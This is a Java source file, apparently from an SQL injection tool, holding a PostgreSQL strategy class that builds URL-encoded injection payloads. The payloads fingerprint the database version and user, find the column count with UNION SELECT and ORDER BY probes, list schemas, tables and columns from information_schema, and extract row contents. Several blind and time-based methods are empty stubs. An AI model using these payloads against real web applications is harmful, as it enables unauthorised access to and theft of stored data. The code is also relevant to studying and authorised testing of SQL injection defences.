package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class PostgreSQLStrategy implements ISQLStrategy {

    @Override
    public String getSchemaInfos() {
        return 
            "concat_ws(" +
                "'{%}'," +
                "version()," +
                "current_database()," +
                "user," +
                "session_user" +
            ")" +
            "||" +
            "'%01%03%03%07'";
    }

    @Override
    public String getSchemaList() {
        return 
            "select+array_to_string(array(" +
                "select" +
                    "'%04'||" +
                    "r||" +
                    "'%05'||" +
                    "q::text||" +
                    "'%04'" +
                "from(" +
                    "SELECT+" +
                        "tables.table_schema+r," +
                        "count(table_name)q+" +
                    "FROM+" +
                        "information_schema.tables+" +
                    "group+by+r+" +
                    "order+by+r{limit}" +
                ")x" +
            "),'%06')" +
            "||" +
            "'%01%03%03%07'";
    }

    @Override
    public String getTableList(Database database) {
        return
            "select+array_to_string(array(" +
                "select" +
                    "'%04'||" +
                    "r||" +
                    "'%05'||" +
                    "q::text||" +
                    "'%04'" +
                "from(" +
                    "SELECT+" +
                        "tables.table_name+r,'0'q+" +
                    "FROM+" +
                        "information_schema.tables+" +
                    "where+tables.TABLE_SCHEMA='" + database.toString() + "'" +
                    "order+by+r{limit}" +
                ")x" +
            "),'%06')" +
            "||" +
            "'%01%03%03%07'";
    }

    @Override
    public String getColumnList(Table table) {
        return
            "select+array_to_string(array(" +
                "select" +
                    "'%04'||" +
                    "r||" +
                    "'%05'||" +
                    "q::text||" +
                    "'%04'" +
                "from(" +
                    "SELECT+" +
                        "columns.column_name+r,'0'q+" +
                    "FROM+" +
                        "information_schema.columns+" +
                    "where+columns.TABLE_SCHEMA='" + table.getParent().toString() + "'" +
                    "and+columns.TABLE_name='" + table.toString() + "'" +
                    "order+by+r{limit}" +
                ")x" +
            "),'%06')" +
            "||" +
            "'%01%03%03%07'";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "::text,''))||chr(127)||trim(coalesce(");
        formatListColumn = "trim(coalesce(" + formatListColumn + "::text,''))";
        
        return
            "select+array_to_string(array(" +
                "select" +
                    "'%04'||" +
                    "r||" +
                    "'%05'||" +
                    "q::text||" +
                    "'%04'" +
                "from(" +
                    "SELECT+" +
                        "substr((" + formatListColumn + "),1,775)r,count(*)q+" +
                    "FROM+" +
                        "" + database + "." + table + "+" +
                    "group+by+r{limit}" +
                ")x" +
            "),'%06')" +
            "||" +
            "'%01%03%03%07'";
    }

    @Override
    public String getPrivilege() {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String readTextFile(String filePath) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String writeTextFile(String content, String filePath) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String[] getListFalseTest() {
        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
    }

    @Override
    public String getBlindFirstTest() {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String blindCheck(String check) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String blindBitTest(String inj, int indexCharacter, int bit) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String blindLengthTest(String inj, int indexCharacter) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String timeCheck(String check) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String timeBitTest(String inj, int indexCharacter, int bit) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String timeLengthTest(String inj, int indexCharacter) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String blindStrategy(String sqlQuery, String startPosition) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String getErrorBasedStrategyCheck() {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String errorBasedStrategy(String sqlQuery, String startPosition) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return 
            "select+" +
                /**
                 * If reach end of string (SQLii) then NULLIF nullifies the result
                 */
                "'SQLi'||NULLIF(substr(" +
                    "(" + sqlQuery + ")," +
                    startPosition + "," +
                    "65536" +
                "),'%01%03%03%07')";
    }

    @Override
    public String timeStrategy(String sqlQuery, String startPosition) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return 
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "(select+'SQLi'||$1||repeat(chr(35),1024)||'iLQS')"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("(1337"+ i +"7330%2b1)::text");
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "--+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
//        return "+limit+" + limitSQLResult + ",65536";
        return "+limit+65536+offset+" + limitSQLResult;
    }
    
    @Override
    public String getDbLabel() {
        return null;
    }
}